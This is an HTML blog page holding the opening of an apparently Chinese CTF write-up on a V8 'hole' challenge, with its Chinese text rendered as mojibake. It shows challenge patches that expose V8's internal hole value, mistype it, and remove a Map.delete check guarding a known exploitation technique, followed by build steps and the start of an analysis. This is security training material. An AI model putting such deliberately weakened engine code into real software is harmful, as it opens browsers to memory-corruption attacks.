<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="hole Â§çÁé∞ 12345There&amp;#x27;s a hole in the program ?Well I&amp;#x27;m sure it&amp;#x27;s not that of a big deal, after all it&amp;#x27;s just a small hole that won&amp;#x27;t do any damage right ?... Right üò® ?  ÊèêÁ§∫‰ø°ÊÅØÂ¶Ç‰∏ãÔºö">
<meta property="og:type" content="article">
<meta property="og:title" content="V8ÁéØÂ¢ÉÊê≠Âª∫+JavaScript pwn+hole attack">
<meta property="og:url" content="http://example.com/2022/12/02/V8%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA+JavaScript%20pwn+hole%20attack/index.html">
<meta property="og:site_name" content="PwnËøõ‰Ω†ÁöÑÂøÉ">
<meta property="og:description" content="hole Â§çÁé∞ 12345There&amp;#x27;s a hole in the program ?Well I&amp;#x27;m sure it&amp;#x27;s not that of a big deal, after all it&amp;#x27;s just a small hole that won&amp;#x27;t do any damage right ?... Right üò® ?  ÊèêÁ§∫‰ø°ÊÅØÂ¶Ç‰∏ãÔºö">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://example.com/2022/12/02/V8%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA+JavaScript%20pwn+hole%20attack/1669786173114.png">
<meta property="article:published_time" content="2022-12-02T10:44:57.000Z">
<meta property="article:modified_time" content="2022-12-02T10:46:48.000Z">
<meta property="article:author" content="yhellow">
<meta property="article:tag" content="V8">
<meta property="article:tag" content="javascript pwn">
<meta property="article:tag" content="OOB">
<meta property="article:tag" content="hole attack">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/2022/12/02/V8%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA+JavaScript%20pwn+hole%20attack/1669786173114.png">

<link rel="canonical" href="http://example.com/2022/12/02/V8%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA+JavaScript%20pwn+hole%20attack/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'en'
  };
</script>

  <title>V8ÁéØÂ¢ÉÊê≠Âª∫+JavaScript pwn+hole attack | PwnËøõ‰Ω†ÁöÑÂøÉ</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">PwnËøõ‰Ω†ÁöÑÂøÉ</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/12/02/V8%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA+JavaScript%20pwn+hole%20attack/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="PwnËøõ‰Ω†ÁöÑÂøÉ">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          V8ÁéØÂ¢ÉÊê≠Âª∫+JavaScript pwn+hole attack
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-12-02 18:44:57 / Modified: 18:46:48" itemprop="dateCreated datePublished" datetime="2022-12-02T18:44:57+08:00">2022-12-02</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Reappearance/" itemprop="url" rel="index"><span itemprop="name">Reappearance</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
              <span class="post-meta-item-icon">
                <i class="eye"></i>
              </span>
              <span class="post-meta-item-text">Views: </span>
              <span id="busuanzi_value_page_pv"></span>
            </span>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>35k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>32 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <p><strong>hole Â§çÁé∞</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">There<span class="number">&#x27;</span>s a hole in the program ?</span><br><span class="line"></span><br><span class="line">Well I<span class="number">&#x27;</span>m sure it<span class="number">&#x27;</span>s <span class="keyword">not</span> that of a big deal, after all it<span class="number">&#x27;</span>s just a small hole that won<span class="number">&#x27;</span>t <span class="keyword">do</span> any damage right ?</span><br><span class="line"></span><br><span class="line">... Right üò® ?</span><br></pre></td></tr></table></figure>
<ul>
<li>ÊèêÁ§∫‰ø°ÊÅØÂ¶Ç‰∏ãÔºö</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">‚ûú  hole cat README.txt   </span><br><span class="line">* Based on git commit hash: <span class="number">63</span>cb7fb817e60e5633fb622baf18c59da7a0a682</span><br><span class="line">* args.gn:</span><br><span class="line">dcheck_always_on = <span class="literal">false</span>                                                                                                                                          </span><br><span class="line">is_debug = <span class="literal">false</span></span><br><span class="line">target_cpu = <span class="string">&quot;x64&quot;</span></span><br><span class="line">v8_enable_sandbox = <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">* It is recommended that you solve <span class="keyword">this</span> challenge on a Debian Linux <span class="number">11.5</span><span class="number">.0</span> machine.% </span><br></pre></td></tr></table></figure>
<ul>
<li>‰∏§‰∏™ patch Êñá‰ª∂Â¶Ç‰∏ãÔºö</li>
</ul>
<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc</span></span><br><span class="line"><span class="comment">index 6e0cd408e7..aafdfb8544 100644</span></span><br><span class="line"><span class="comment">--- a/src/builtins/builtins-array.cc</span></span><br><span class="line"><span class="comment">+++ b/src/builtins/builtins-array.cc</span></span><br><span class="line"><span class="meta">@@ -395,6 +395,12 @@</span> BUILTIN(ArrayPush) &#123;</span><br><span class="line">   return *isolate-&gt;factory()-&gt;NewNumberFromUint((new_length));</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"><span class="addition">+BUILTIN(ArrayHole)&#123;</span></span><br><span class="line"><span class="addition">+    uint32_t len = args.length();</span></span><br><span class="line"><span class="addition">+    if(len &gt; 1) return ReadOnlyRoots(isolate).undefined_value();</span></span><br><span class="line"><span class="addition">+    return ReadOnlyRoots(isolate).the_hole_value();</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"> namespace &#123;</span><br><span class="line"> </span><br><span class="line"> V8_WARN_UNUSED_RESULT Object GenericArrayPop(Isolate* isolate,</span><br><span class="line"><span class="comment">diff --git a/src/builtins/builtins-collections-gen.cc b/src/builtins/builtins-collections-gen.cc</span></span><br><span class="line"><span class="comment">index 78b0229011..55aaaa03df 100644</span></span><br><span class="line"><span class="comment">--- a/src/builtins/builtins-collections-gen.cc</span></span><br><span class="line"><span class="comment">+++ b/src/builtins/builtins-collections-gen.cc</span></span><br><span class="line"><span class="meta">@@ -1763,7 +1763,7 @@</span> TF_BUILTIN(MapPrototypeDelete, CollectionsBuiltinsAssembler) &#123;</span><br><span class="line">                          &quot;Map.prototype.delete&quot;);</span><br><span class="line"> </span><br><span class="line">   // This check breaks a known exploitation technique. See crbug.com/1263462</span><br><span class="line"><span class="deletion">-  CSA_CHECK(this, TaggedNotEqual(key, TheHoleConstant()));</span></span><br><span class="line"><span class="addition">+  //CSA_CHECK(this, TaggedNotEqual(key, TheHoleConstant()));</span></span><br><span class="line"> </span><br><span class="line">   const TNode&lt;OrderedHashMap&gt; table =</span><br><span class="line">       LoadObjectField&lt;OrderedHashMap&gt;(CAST(receiver), JSMap::kTableOffset);</span><br><span class="line"><span class="comment">diff --git a/src/builtins/builtins-definitions.h b/src/builtins/builtins-definitions.h</span></span><br><span class="line"><span class="comment">index 0e98586f7f..28a46f2856 100644</span></span><br><span class="line"><span class="comment">--- a/src/builtins/builtins-definitions.h</span></span><br><span class="line"><span class="comment">+++ b/src/builtins/builtins-definitions.h</span></span><br><span class="line"><span class="meta">@@ -413,6 +413,7 @@</span> namespace internal &#123;</span><br><span class="line">   TFJ(ArrayPrototypeFlat, kDontAdaptArgumentsSentinel)                         \</span><br><span class="line">   /* https://tc39.github.io/proposal-flatMap/#sec-Array.prototype.flatMap */   \</span><br><span class="line">   TFJ(ArrayPrototypeFlatMap, kDontAdaptArgumentsSentinel)                      \</span><br><span class="line"><span class="addition">+  CPP(ArrayHole)                                                               \</span></span><br><span class="line">                                                                                \</span><br><span class="line">   /* ArrayBuffer */                                                            \</span><br><span class="line">   /* ES #sec-arraybuffer-constructor */                                        \</span><br><span class="line"><span class="comment">diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc</span></span><br><span class="line"><span class="comment">index 79bdfbddcf..c42ad4c789 100644</span></span><br><span class="line"><span class="comment">--- a/src/compiler/typer.cc</span></span><br><span class="line"><span class="comment">+++ b/src/compiler/typer.cc</span></span><br><span class="line"><span class="meta">@@ -1722,6 +1722,8 @@</span> Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) &#123;</span><br><span class="line">       return Type::Receiver();</span><br><span class="line">     case Builtin::kArrayUnshift:</span><br><span class="line">       return t-&gt;cache_-&gt;kPositiveSafeInteger;</span><br><span class="line"><span class="addition">+    case Builtin::kArrayHole:</span></span><br><span class="line"><span class="addition">+      return Type::Oddball();</span></span><br><span class="line"> </span><br><span class="line">     // ArrayBuffer functions.</span><br><span class="line">     case Builtin::kArrayBufferIsView:</span><br><span class="line"><span class="comment">diff --git a/src/init/bootstrapper.cc b/src/init/bootstrapper.cc</span></span><br><span class="line"><span class="comment">index 9040e95202..a77333287a 100644</span></span><br><span class="line"><span class="comment">--- a/src/init/bootstrapper.cc</span></span><br><span class="line"><span class="comment">+++ b/src/init/bootstrapper.cc</span></span><br><span class="line"><span class="meta">@@ -1800,6 +1800,7 @@</span> void Genesis::InitializeGlobal(Handle&lt;JSGlobalObject&gt; global_object,</span><br><span class="line">                           Builtin::kArrayPrototypeFindIndex, 1, false);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;lastIndexOf&quot;,</span><br><span class="line">                           Builtin::kArrayPrototypeLastIndexOf, 1, false);</span><br><span class="line"><span class="addition">+    SimpleInstallFunction(isolate_, proto, &quot;hole&quot;, Builtin::kArrayHole, 0, false);</span></span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;pop&quot;, Builtin::kArrayPrototypePop,</span><br><span class="line">                           0, false);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;push&quot;, Builtin::kArrayPrototypePush,</span><br></pre></td></tr></table></figure>
<ul>
<li>Ê≥®ÂÜå‰∫ÜÁõÆÊ†áÊñπÊ≥ïÔºåÂπ∂‰∏îÁªôÂá∫‰∫Ü‰∏Ä‰∏™ÁΩëÈ°µ <code>crbug.com/1263462</code></li>
</ul>
<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">diff --git a/src/d8/d8-posix.cc b/src/d8/d8-posix.cc</span></span><br><span class="line"><span class="comment">index c2571ef3a01..e4f27cfdca6 100644</span></span><br><span class="line"><span class="comment">--- a/src/d8/d8-posix.cc</span></span><br><span class="line"><span class="comment">+++ b/src/d8/d8-posix.cc</span></span><br><span class="line"><span class="meta">@@ -734,6 +734,7 @@</span> char* Shell::ReadCharsFromTcpPort(const char* name, int* size_out) &#123;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> void Shell::AddOSMethods(Isolate* isolate, Local&lt;ObjectTemplate&gt; os_templ) &#123;</span><br><span class="line"><span class="addition">+/*    </span></span><br><span class="line">   if (options.enable_os_system) &#123;</span><br><span class="line">     os_templ-&gt;Set(isolate, &quot;system&quot;, FunctionTemplate::New(isolate, System));</span><br><span class="line">   &#125;</span><br><span class="line"><span class="meta">@@ -748,6 +749,7 @@</span> void Shell::AddOSMethods(Isolate* isolate, Local&lt;ObjectTemplate&gt; os_templ) &#123;</span><br><span class="line">                 FunctionTemplate::New(isolate, MakeDirectory));</span><br><span class="line">   os_templ-&gt;Set(isolate, &quot;rmdir&quot;,</span><br><span class="line">                 FunctionTemplate::New(isolate, RemoveDirectory));</span><br><span class="line"><span class="addition">+*/</span></span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> &#125;  // namespace v8</span><br><span class="line"><span class="comment">diff --git a/src/d8/d8.cc b/src/d8/d8.cc</span></span><br><span class="line"><span class="comment">index c6bacaa732f..63b3c9c27e8 100644</span></span><br><span class="line"><span class="comment">--- a/src/d8/d8.cc</span></span><br><span class="line"><span class="comment">+++ b/src/d8/d8.cc</span></span><br><span class="line"><span class="meta">@@ -3266,6 +3266,7 @@</span> static void AccessIndexedEnumerator(const PropertyCallbackInfo&lt;Array&gt;&amp; info) &#123;&#125;</span><br><span class="line"> </span><br><span class="line"> Local&lt;ObjectTemplate&gt; Shell::CreateGlobalTemplate(Isolate* isolate) &#123;</span><br><span class="line">   Local&lt;ObjectTemplate&gt; global_template = ObjectTemplate::New(isolate);</span><br><span class="line"><span class="addition">+  /*</span></span><br><span class="line">   global_template-&gt;Set(Symbol::GetToStringTag(isolate),</span><br><span class="line">                        String::NewFromUtf8Literal(isolate, &quot;global&quot;));</span><br><span class="line">   global_template-&gt;Set(isolate, &quot;version&quot;,</span><br><span class="line"><span class="meta">@@ -3284,6 +3285,7 @@</span> Local&lt;ObjectTemplate&gt; Shell::CreateGlobalTemplate(Isolate* isolate) &#123;</span><br><span class="line">                        FunctionTemplate::New(isolate, ReadLine));</span><br><span class="line">   global_template-&gt;Set(isolate, &quot;load&quot;,</span><br><span class="line">                        FunctionTemplate::New(isolate, ExecuteFile));</span><br><span class="line"><span class="addition">+  */</span></span><br><span class="line">   global_template-&gt;Set(isolate, &quot;setTimeout&quot;,</span><br><span class="line">                        FunctionTemplate::New(isolate, SetTimeout));</span><br><span class="line">   // Some Emscripten-generated code tries to call &#x27;quit&#x27;, which in turn would</span><br><span class="line"><span class="meta">@@ -3456,6 +3458,7 @@</span> Local&lt;FunctionTemplate&gt; Shell::CreateSnapshotTemplate(Isolate* isolate) &#123;</span><br><span class="line"> &#125;</span><br><span class="line"> Local&lt;ObjectTemplate&gt; Shell::CreateD8Template(Isolate* isolate) &#123;</span><br><span class="line">   Local&lt;ObjectTemplate&gt; d8_template = ObjectTemplate::New(isolate);</span><br><span class="line"><span class="addition">+  /*</span></span><br><span class="line">   &#123;</span><br><span class="line">     Local&lt;ObjectTemplate&gt; file_template = ObjectTemplate::New(isolate);</span><br><span class="line">     file_template-&gt;Set(isolate, &quot;read&quot;,</span><br><span class="line"><span class="meta">@@ -3538,6 +3541,7 @@</span> Local&lt;ObjectTemplate&gt; Shell::CreateD8Template(Isolate* isolate) &#123;</span><br><span class="line">                               Local&lt;Signature&gt;(), 1));</span><br><span class="line">     d8_template-&gt;Set(isolate, &quot;serializer&quot;, serializer_template);</span><br><span class="line">   &#125;</span><br><span class="line"><span class="addition">+  */</span></span><br><span class="line">   return d8_template;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>Ê≥®Èáä‰∫ÜÈÉ®ÂàÜÊ∫êÁ†ÅÔºà<code>system</code> Ê≤°‰∫ÜÔºâ</li>
</ul>
<p><strong>ÁéØÂ¢ÉÊê≠Âª∫</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">fetch v8</span><br><span class="line">cd v8</span><br><span class="line">./build/install-build-deps.sh</span><br><span class="line">git checkout 63cb7fb817e60e5633fb622baf18c59da7a0a682</span><br><span class="line">git apply add_hole.patch</span><br></pre></td></tr></table></figure>
<p>Âú® v8 ÂºïÊìéÁöÑ6.5ÁâàÊú¨‰ª•‰∏äÔºågoogle ÈááÁî®‰∫Ü <code>GN+Ninja</code> ÁöÑÁºñËØëÁªÑÂêàÔºåÂõ†Ê≠§ÈúÄË¶Å‰ª•‰∏ãÂ∑•ÂÖ∑Êù•ÂÆâË£Ö‰æùËµñÔºö</p>
<p>ÂÆâË£Ö depot_tools Â∑•ÂÖ∑ÈõÜÔºö</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://chromium.googlesource.com/chromium/tools/depot_tools.git</span><br></pre></td></tr></table></figure>
<ul>
<li>ÁÑ∂ÂêéÂ∞Ü <code>depot_tools</code> Âä†ÂÖ•‰Ω†ÁöÑ <code>PATH</code> ÁéØÂ¢ÉÂèòÈáè‰∏≠ÔºàÂÖ∂ÂÆû‰πüÂèØ‰ª•‰∏çÊ∑ªÂä†Ôºâ</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo gedit /etc/profile.d/yhellow.sh</span><br><span class="line">---------------------------------------</span><br><span class="line">export PATH=&quot;$PATH:/home/yhellow/tools/depot_tools&quot;</span><br></pre></td></tr></table></figure>
<ul>
<li>ÂèñÂæó <code>depot_tools</code> ‰πãÂêéÔºåÈúÄË¶ÅÂèñÂæóÂ§ßÈáèÁºñËØë‰æùËµñÔºågoogle Êèê‰æõ‰∫Ü‰∏Ä‰∏™ÊØîËæÉÊñπ‰æøÁöÑÂ∑•ÂÖ∑ <code>gclient</code> Êù•Ëé∑Âèñ‰æùËµñ</li>
<li>ÁÑ∂ÂêéÂú® V8 ÁöÑÁõÆÂΩï‰∏≠ÊâßË°å‰ª•‰∏ã‰ª£Á†ÅÂÆâË£Ö‰æùËµñÔºöÔºàÊ≥®ÊÑèÔºöV8 ÁöÑË∑ØÂæÑ‰∏çËÉΩÊúâ‰∏≠ÊñáÔºâ</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">export PATH=&quot;$PATH:/home/yhellow/tools/depot_tools&quot;</span><br><span class="line">gclient config https://webrtc.googlesource.com/src.git # ÊúÄÂ•ΩÂä†‰∏äËøô‰∏™,‰∏çÁÑ∂‰ºöÂæàÊÖ¢</span><br><span class="line">export DEPOT_TOOLS_UPDATE=0</span><br><span class="line">gclient sync</span><br></pre></td></tr></table></figure>
<p>ÂàùÂßãÂåñ‰ª•ÂèäÁºñËØëÔºö</p>
<ul>
<li>v8 ‰ΩøÁî® <code>Ninja</code> ‰Ωú‰∏∫ÁºñËØëÂ∑•ÂÖ∑ÔºåÂêåÊó∂‰ΩøÁî® <code>GN</code> Êù•ÁîüÊàê <code>.ninja</code> Êñá‰ª∂</li>
<li>‰ΩøÁî® <code>v8gen</code> ÂèØ‰ª•ÁîüÊàê‰∏çÂêåÂπ≥Âè∞ÁöÑÁºñËØëÈÖçÁΩÆÊñá‰ª∂Ôºö</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./tools/dev/v8gen.py x64.release</span><br></pre></td></tr></table></figure>
<p>Âú® <code>out.gn/x64.release/args.gn</code> ‰∏≠Ê∑ªÂä†Â¶Ç‰∏ãÂëΩ‰ª§ÔºöÔºàÂ¢ûÊ∑ªË∞ÉËØï‰ø°ÊÅØÔºâ</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">symbol_level = <span class="number">2</span></span><br><span class="line">v8_enable_object_print = <span class="literal">true</span></span><br></pre></td></tr></table></figure>
<p>‰ΩøÁî® <code>ninja</code> ÂºÄÂßãÁºñËØëÔºö</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ninja -C ./out.gn/x64.release d8</span><br></pre></td></tr></table></figure>
<p>ÂèØ‰ª•Áî® <code>find</code> ÂëΩ‰ª§Êù•Êü•ÊâæÂèØÊâßË°åÊñá‰ª∂ÁöÑ‰ΩçÁΩÆÔºö</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">‚ûú  v8 git:(63cb7fb817) ‚úó find ./ -name d8 -type f</span><br></pre></td></tr></table></figure>
<p>Âè¶Â§ñÔºåV8ËøòÁªô GDB Êèê‰æõ‰∫Ü‰∏Ä‰∫õÂ∑•ÂÖ∑ÔºåÂèØ‰ª•Êää‰ª•‰∏ãËøôË°åÂëΩ‰ª§Ê∑ªÂä†Âà∞ GDB ÁöÑ <code>.gdbinit</code> ‰∏≠Ôºö</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source /home/yhellow/tools/v8/v8/tools/gdbinit</span><br></pre></td></tr></table></figure>
<p>ÂèÇËÄÉÔºö<a target="_blank" rel="noopener" href="https://chenquan.me/posts/how-to-compile-v8-engine-by-gn/">Â¶Ç‰ΩïÁî®GNÁºñËØëV8ÂºïÊìé</a> </p>
<p><strong>patch ÂàÜÊûê</strong></p>
<p>Á¨¨2‰∏™ patch Â∞±ÊòØÊ≥®Èáä‰∫ÜÊ∫êÁ†ÅÁöÑ‰∏Ä‰∫õÂäüËÉΩÔºàÊöÇÊó∂‰∏çÁî®ÁÆ°Ôºâ</p>
<p>Á¨¨1‰∏™ patch Â∫îËØ•Â∞±ÊòØÊºèÊ¥ûÂà©Áî®ÁöÑÂÖ≥ÈîÆ‰∫ÜÔºö</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> Builtin::kArrayHole:</span><br><span class="line">  <span class="keyword">return</span> Type::Oddball();</span><br></pre></td></tr></table></figure>
<ul>
<li>ËøôÈáåËßÑÂÆö <code>Builtin::kArrayHole</code> ËøîÂõû‰∏Ä‰∏™ <code>Oddball</code> ÂºïÁî®Á±ªÂûã</li>
<li><code>oddball</code> ÊòØÊï∞ÊçÆÁ±ªÂûãÁöÑÂºïÁî®ÔºåË°®Á§∫Âú® V8 ‰∏≠ÊÄé‰πàË∞ÉÁî®Áõ∏ÂÖ≥Á±ªÂûãÔºà<code>null undefined true false</code> ÂêàÁß∞‰∏∫ <code>oddball</code>Ôºâ</li>
</ul>
